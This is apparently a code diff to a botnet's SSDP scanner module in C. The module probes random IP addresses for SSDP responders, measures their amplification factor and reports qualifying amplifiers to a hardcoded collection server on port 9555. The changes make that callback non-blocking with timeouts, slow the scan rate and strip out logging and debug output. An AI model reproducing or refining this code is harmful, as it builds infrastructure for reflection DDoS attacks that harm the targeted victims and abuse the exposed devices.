@@ -6,6 +6,7 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 #include <sys/select.h>
+#include <sys/time.h>
 #include <sys/types.h>
 #include <time.h>
 #include <fcntl.h>
@@ -42,14 +43,40 @@ static void ssdp_report_amplifier(ipv4_t addr, uint16_t port, uint32_t amplifica
 {
     int fd = socket(AF_INET, SOCK_STREAM, 0);
     if (fd < 0) return;
+    
+    fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
+    
     struct sockaddr_in cb;
     cb.sin_family = AF_INET;
     cb.sin_addr.s_addr = SCANIP;
     cb.sin_port = htons(9555);
-    if (connect(fd, (struct sockaddr *)&cb, sizeof(cb)) == -1) {
+    
+    int ret = connect(fd, (struct sockaddr *)&cb, sizeof(cb));
+    if (ret == -1 && errno != EINPROGRESS) {
         close(fd);
         return;
     }
+    
+    fd_set write_fds;
+    FD_ZERO(&write_fds);
+    FD_SET(fd, &write_fds);
+    
+    struct timeval timeout;
+    timeout.tv_sec = 2;
+    timeout.tv_usec = 0;
+    
+    if (select(fd + 1, NULL, &write_fds, NULL, &timeout) <= 0 || !FD_ISSET(fd, &write_fds)) {
+        close(fd);
+        return;
+    }
+    
+    int err = 0;
+    socklen_t err_len = sizeof(err);
+    if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &err_len) != 0 || err != 0) {
+        close(fd);
+        return;
+    }
+    
     uint8_t marker = 0xFF;
     uint16_t port_net = htons(port);
     uint32_t amp_factor = htonl(amplification_factor);
@@ -131,23 +158,32 @@ void ssdp_scanner(void)
     
     while(1)
     {
-        for(int i = 0; i < 200; i++)
+        for(int i = 0; i < 50; i++)
         {
             ipv4_t target = get_random_ssdp_ip();
             ssdp_setup_connection(target);
         }
-        scan_count += 200;
+        scan_count += 50;
+        usleep(100000);
         
         int responses_processed = 0;
-        while(responses_processed < 100)
+        struct timeval start_time;
+        gettimeofday(&start_time, NULL);
+        
+        while(responses_processed < 20)
         {
+            struct timeval now;
+            gettimeofday(&now, NULL);
+            if((now.tv_sec - start_time.tv_sec) > 2)
+                break;
+            
             fd_set read_fds;
             FD_ZERO(&read_fds);
             FD_SET(ssdp_udp_fd, &read_fds);
             
             struct timeval tv;
             tv.tv_sec = 0;
-            tv.tv_usec = 50000;
+            tv.tv_usec = 100000;
             
             if(select(ssdp_udp_fd + 1, &read_fds, NULL, NULL, &tv) > 0)
             {
@@ -166,36 +202,18 @@ void ssdp_scanner(void)
                         if(amplification >= SSDP_MIN_AMPLIFICATION)
                         {
                             ssdp_report_amplifier(from_ip, from_port, amplification);
-                            char amp_str[32];
-                            snprintf(amp_str, sizeof(amp_str), "%ux", amplification);
-                            log_event("ssdp", "amplifier_found", from_ip, from_port, amp_str);
                         }
                         responses_processed++;
                     }
-                    else
+                    else if(errno != EAGAIN && errno != EWOULDBLOCK)
                     {
                         break;
                     }
                 }
-                else
-                {
-                    break;
-                }
-            }
-            else
-            {
-                break;
             }
         }
         
-        if(scan_count % 10000 == 0)
-        {
-            #ifdef DEBUG
-            printf("[ssdp_scanner] Scanned %u IPs, found amplifiers\n", scan_count);
-            #endif
-        }
-        
-        usleep(50000);
+        usleep(200000);
     }
 }
 
